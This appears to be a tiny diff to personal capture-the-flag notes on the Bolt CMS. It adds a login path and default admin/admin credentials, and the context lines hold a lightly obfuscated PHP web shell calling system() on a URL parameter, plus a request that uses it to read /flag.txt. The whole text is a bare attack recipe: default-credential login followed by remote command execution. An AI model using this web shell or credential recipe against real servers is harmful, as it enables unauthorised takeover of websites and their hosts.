@@ -1,3 +1,5 @@
 Bolt
+ip/bolt/login
+us:admin pass:admin
 '<(questionmark)php echo system($_GET['cmd'](semicolon)(questionmark))>'
 ip:port/files/file.php?cmd=cat%20/flag.txt
